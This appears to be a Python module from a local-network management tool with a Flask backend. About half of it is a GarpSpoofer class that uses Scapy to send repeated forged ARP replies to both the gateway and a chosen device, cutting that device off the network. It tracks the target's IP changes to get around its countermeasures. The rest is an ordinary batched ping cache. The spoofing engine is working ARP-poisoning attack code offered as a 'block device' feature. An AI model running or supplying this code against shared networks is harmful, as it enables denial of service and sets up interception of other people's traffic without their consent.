from scapy.all import ARP, Ether, srp, sendp, conf, sniff
from threading import Thread, Lock
import time
from src.ping import get_default_gateway
import platform
import subprocess
import re
import threading
from functools import lru_cache
from typing import Dict, List, Any, Optional, Set

class GarpSpoofer:
    def __init__(self):
        self.gateway_ip = get_default_gateway()
        self.mac_cache = {} 
        self.targets = {}
        self.lock = Lock()
        self.active = True
        conf.verb = 0
        
        self.gateway_mac = self.resolve_mac(self.gateway_ip)

    def start(self):
        """Starts the monitoring and spoofing threads."""
        Thread(target=self.monitor_arp, daemon=True).start()
        Thread(target=self.spoof_engine, daemon=True).start()

    def resolve_mac(self, ip):
        if ip in self.mac_cache:
            return self.mac_cache[ip]
        
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                        timeout=2, verbose=0)
            if ans:
                mac = ans[0][1].hwsrc
                self.mac_cache[ip] = mac
                return mac
        except Exception as e:
            print(f"MAC resolution failed for {ip}: {e}")
        return None

    def craft_garp(self, ip, mac):
        return Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")/ARP(
            op=2,
            psrc=ip,
            hwsrc=mac,
            pdst=ip
        )

    def monitor_arp(self):
        def arp_handler(pkt):
            if ARP in pkt and pkt[ARP].op == 1:
                with self.lock:
                    for target in self.targets.values():
                        if pkt[ARP].hwsrc == target['real_mac']:
                            new_ip = pkt[ARP].psrc
                            if new_ip == "0.0.0.0":
                                continue
                            if new_ip != target['ip']:
                                print(f"Anti-ARP detected for {target['real_mac']}. New IP: {new_ip}")
                                target['ip'] = new_ip
                                target['last_request'] = time.time()  # Use time.time()

        sniff(prn=arp_handler, filter="arp", store=0)

    def spoof_engine(self):
        while self.active:
            with self.lock:
                targets = list(self.targets.values())
            
            packets = []
            for target in targets:
                gw_garp = self.craft_garp(self.gateway_ip, target['spoof_mac'])
                tg_garp = self.craft_garp(target['ip'], self.gateway_mac)
                packets.extend([gw_garp, tg_garp] * 3)

            if packets:
                sendp(packets, verbose=0)
            
            if targets:
                update_time = time.time()  # Use time.time()
                for target in targets:
                    target['last_garp'] = update_time

            time.sleep(0.8)  # Use time.sleep() instead of sleep()

    def block_device(self, ip, mac):
        with self.lock:
            if mac in self.targets:
                print(f"Device {mac} already blocked")
                return

            if not self.validate_target(ip, mac):
                return

            self.targets[mac] = {
                'ip': ip,
                'real_mac': mac,
                'spoof_mac': conf.iface.mac,
                'last_garp': 0,
                'last_request': time.time()  # Use time.time()
            }
            print(f"Blocking {ip} ({mac})")

    def validate_target(self, ip, mac):
        current_mac = self.resolve_mac(ip)
        if current_mac and current_mac.lower() != mac.lower():
            print(f"MAC mismatch for {ip} (expected {mac}, got {current_mac})")
            return False
        return True

    def restore_device(self, mac):
        with self.lock:
            target = self.targets.pop(mac, None)
            if not target:
                print(f"Device {mac} not found in blocked targets.")
                return

            # Resolve the current IP of the device in case it has changed
            current_ip = self.resolve_mac(target['real_mac'])
            if current_ip and current_ip != target['ip']:
                print(f"IP address for {mac} has changed from {target['ip']} to {current_ip}. Updating...")
                target['ip'] = current_ip

        # Send multiple GARP packets to ensure the device is restored reliably
        real_gw_garp = self.craft_garp(self.gateway_ip, self.gateway_mac)
        real_tg_garp = self.craft_garp(target['ip'], target['real_mac'])

        print(f"Restoring device {target['ip']} ({mac}) with multiple GARP packets...")
        for _ in range(5):  # Send GARP packets multiple times to ensure reliability
            sendp([real_gw_garp, real_tg_garp], verbose=0)
            time.sleep(0.2)  # Use time.sleep() instead of sleep()

        print(f"Device {target['ip']} ({mac}) restored successfully.")

    def __del__(self):
        self.active = False
        # Check if targets attribute exists before trying to access its keys
        if hasattr(self, 'targets'):
            for mac in list(self.targets.keys()):
                self.restore_device(mac)

class PingManager:
    def __init__(self, cache_timeout=5):
        self.ping_cache = {}
        self.cache_timeout = cache_timeout
        self.lock = threading.RLock()
        self.active_pings = set()
        self.ping_queue = set()
        self.ping_thread = None
        self.ping_interval = 1
        self.is_running = False
    
    def start_background_thread(self):
        if self.ping_thread is None or not self.ping_thread.is_alive():
            self.is_running = True
            self.ping_thread = threading.Thread(target=self._ping_worker, daemon=True)
            self.ping_thread.start()
    
    def _ping_worker(self):
        while self.is_running:
            current_batch = set()
            
            # Get items from queue
            with self.lock:
                current_batch = self.ping_queue.copy()
                self.ping_queue.clear()
            
            if current_batch:
                # Process this batch
                results = self._process_ping_batch(current_batch)
                
                # Update cache with results
                with self.lock:
                    current_time = time.time()
                    for ip, data in results.items():
                        self.ping_cache[ip] = {
                            'timestamp': current_time,
                            'data': data
                        }
            
            # Clear old cache entries
            self._clean_cache()
            
            # Sleep before next batch
            time.sleep(self.ping_interval)
    
    def _clean_cache(self):
        with self.lock:
            current_time = time.time()
            expired_keys = [ip for ip, data in self.ping_cache.items() 
                           if current_time - data['timestamp'] > self.cache_timeout * 2]
            for ip in expired_keys:
                del self.ping_cache[ip]
    
    def _process_ping_batch(self, ips: Set[str]) -> Dict[str, Any]:
        thread_results = {}  
        threads = []
        
        for ip in ips:
            thread = threading.Thread(
                target=self._ping_single_ip,
                args=(ip, thread_results)
            )
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join(1.5)  # Timeout after 1.5 seconds
        
        return thread_results
    
    def _ping_single_ip(self, ip: str, results_dict: Dict[str, Any]):
        start_time = time.time()
        success = False
        ping_time = 0
        
        try:
            silent_param = ['-n', '1', '-w', '500'] if platform.system().lower() == 'windows' else ['-c', '1', '-W', '0.5']
            result = subprocess.run(
                ['ping'] + silent_param + [ip],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=1.0,
                text=True
            )
            end_time = time.time()
            
            success = result.returncode == 0
            if success:
                ping_time = self._parse_ping_output(result.stdout, start_time, end_time)
            
            # Calculate signal strength based on ping time
            signal_strength = max(0, min(100, 100 - (ping_time / 2)))
            
            results_dict[ip] = {
                'ip': ip,
                'success': success,
                'time': ping_time,
                'signal': round(signal_strength),
                'output': 'Ping successful' if success else 'Ping failed'
            }
        except Exception as e:
            end_time = time.time()
            results_dict[ip] = {
                'ip': ip,
                'success': False,
                'time': int((end_time - start_time) * 1000),
                'signal': 0,
                'error': str(e)
            }
    
    @lru_cache(maxsize=128)
    def _parse_ping_output(self, output: str, start_time: float, end_time: float) -> int:
        try:
            if platform.system().lower() == 'windows':
                match = re.search(r'Average = (\d+)ms', output)
                if not match:
                    match = re.search(r'time[=<](\d+)ms', output)
                ping_time = int(match.group(1)) if match else int((end_time - start_time) * 1000)
            else:
                match = re.search(r'time=(\d+\.\d+) ms', output)
                ping_time = float(match.group(1)) if match else int((end_time - start_time) * 1000)
            return int(ping_time)
        except:
            return int((end_time - start_time) * 1000)
    
    def request_ping(self, ip: str) -> None:
        with self.lock:
            self.ping_queue.add(ip)
    
    def get_ping_data(self, ip: str) -> Optional[Dict[str, Any]]:
        with self.lock:
            cached = self.ping_cache.get(ip)
            if cached:
                current_time = time.time()
                if current_time - cached['timestamp'] < self.cache_timeout:
                    return cached['data']
            
            # Not in cache or expired
            self.ping_queue.add(ip)
            return None
    
    def get_ping_batch(self, ips: List[str]) -> Dict[str, Any]:
        cached_results = {} 
        missing_ips = []
        
        with self.lock:
            current_time = time.time()
            
            for ip in ips:
                cached = self.ping_cache.get(ip)
                if cached and current_time - cached['timestamp'] < self.cache_timeout:
                    cached_results[ip] = cached['data']
                else:
                    missing_ips.append(ip)
                    self.ping_queue.add(ip)
        
        return cached_results  # Return the gathered cached results

# Create a global instance
ping_manager = PingManager()

# Helper functions to be used by Flask routes
def request_ping_for_ip(ip: str) -> None:
    ping_manager.request_ping(ip)

def get_ping_data_for_ip(ip: str) -> Dict[str, Any]:
    return ping_manager.get_ping_data(ip)

def get_ping_data_for_batch(ips: List[str]) -> Dict[str, Any]:
    return ping_manager.get_ping_batch(ips)
